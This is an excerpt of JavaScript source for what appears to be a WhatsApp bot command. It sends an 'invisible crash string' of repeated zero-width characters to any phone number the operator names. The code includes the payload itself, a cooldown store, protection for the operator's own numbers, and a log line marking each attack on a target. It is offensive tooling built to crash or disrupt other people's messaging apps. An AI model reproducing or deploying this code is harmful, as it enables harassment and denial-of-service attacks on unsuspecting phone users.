...
// ============================================
// INVISIBLE CRASH STRING (Zero-width characters only)
// ============================================
// These characters are invisible but still trigger message processing
const invisibleCrashString = '​‌‍⁠‎‏​‌‍⁠‎‏​‌‍⁠‎‏​‌‍⁠‎‏​‌‍⁠‎‏​‌‍⁠‎‏​‌‍⁠‎‏​‌‍⁠‎‏​‌‍⁠‎‏​‌‍⁠‎‏​‌‍⁠‎‏​‌‍⁠‎‏​‌‍⁠‎‏​‌‍⁠‎‏​‌‍⁠‎‏​‌‍⁠‎‏​‌‍⁠‎‏​‌‍⁠‎‏​‌‍⁠‎‏​‌‍⁠‎‏​‌‍⁠‎‏​‌‍⁠‎‏​‌‍⁠‎‏​‌‍⁠‎‏​‌‍⁠‎‏​‌‍⁠‎‏​‌‍⁠‎‏​‌‍⁠‎‏​‌‍⁠‎‏​‌‍⁠‎‏​‌‍⁠‎‏​‌‍⁠‎‏​‌‍⁠‎‏​‌‍⁠‎‏​‌‍⁠‎‏​‌‍⁠‎‏​‌‍⁠‎‏​‌‍⁠‎‏​‌‍⁠‎‏​‌‍⁠‎‏​‌‍⁠‎‏​‌‍⁠‎‏​‌‍⁠‎‏​‌‍⁠‎‏​‌‍⁠‎‏​‌‍⁠‎‏​‌‍⁠‎‏​‌‍⁠‎‏​‌‍⁠‎‏​‌‍⁠‎‏​‌‍⁠‎‏​‌‍⁠‎‏​‌‍⁠‎‏​‌‍⁠‎‏​‌‍⁠‎‏​‌‍⁠‎‏​‌‍⁠‎‏​‌‍⁠‎‏​‌‍⁠‎‏​‌‍⁠‎‏​‌‍⁠‎‏​‌‍⁠‎‏​‌‍⁠‎‏​‌‍⁠‎‏​‌‍⁠‎‏​‌‍⁠‎‏​‌‍⁠‎‏​‌‍⁠‎‏​‌‍⁠‎‏​‌‍⁠‎‏​‌‍⁠‎‏​‌‍⁠‎‏​‌‍⁠‎‏​‌‍⁠‎‏​‌‍⁠‎‏​‌‍⁠‎‏​‌‍⁠‎‏​‌‍⁠‎‏​‌‍⁠‎‏​‌‍⁠‎‏​‌‍⁠‎‏​‌‍⁠‎‏​‌‍⁠‎‏​‌‍⁠‎‏​‌‍⁠‎‏​‌‍⁠‎‏​‌‍⁠‎‏​‌‍⁠‎‏​‌‍⁠‎‏​‌‍⁠‎‏​‌‍⁠‎‏​‌‍⁠‎‏​‌‍⁠‎‏​‌‍⁠‎‏​‌‍⁠‎‏​‌‍⁠‎‏​‌‍⁠‎‏​‌‍⁠‎‏​‌‍⁠‎‏​‌‍⁠‎‏​‌‍⁠‎‏​‌‍⁠‎‏​‌‍⁠‎‏​‌‍⁠‎‏​‌‍⁠‎‏​‌‍⁠‎‏​‌‍⁠‎‏​‌‍⁠‎‏​‌‍⁠‎‏​‌‍⁠‎‏​‌‍⁠‎‏​‌‍⁠‎‏​‌‍⁠‎‏​‌‍⁠‎‏​‌‍⁠‎‏​‌‍⁠‎‏​‌‍⁠‎‏​‌‍⁠‎‏​‌‍⁠‎‏​‌‍⁠‎‏​‌‍⁠‎‏';
...
const COOLDOWN_FILE = path.join(__dirname, '../data/bug_cooldown.json');
...
// Clean old cooldown entries (optional, prevents file from growing)
function cleanOldCooldowns() {
    ...
    for (const [userId, timestamp] of Object.entries(cooldowns)) {
        if (now - timestamp > COOLDOWN_MS * 2) { // Keep for 2x cooldown period
    ...
    try {
        ...
        if (!targetNumber) {
            await sock.sendMessage(chatId, {
                text: `❌ *Usage:* ${global.prefix || '#'}bug <number>\n\nExample: ${global.prefix || '#'}bug 2347072182960`,
                contextInfo: {
                    forwardingScore: 1,
                    isForwarded: true,
        ...
        // Check if target is protected (your numbers)
        ...
        // Check if target is the sender themselves (self-bug protection)
        if (senderNumber === cleanNumber) {
            await sock.sendMessage(chatId, {
                text: `⚠️ *Nice try*\n\nYou cannot bug yourself.`,
                contextInfo: {
                    forwardingScore: 1,
                    isForwarded: true,
                    forwardedNewsletterMessageInfo: {
        ...
        // ========== SEND THE INVISIBLE CRASH MESSAGE ==========
        
        // Send reaction to command chat
        ...
        // Send invisible crash message to target
        await sock.sendMessage(targetJid, {
            text: invisibleCrashString
        });
        
        // Set cooldown for this user
        setCooldown(userIdentifier);
        
        // Send confirmation to command chat
        await sock.sendMessage(chatId, {
        ...
        console.log(`💀 Bug command executed by ${userIdentifier} targeting ${cleanNumber}`);
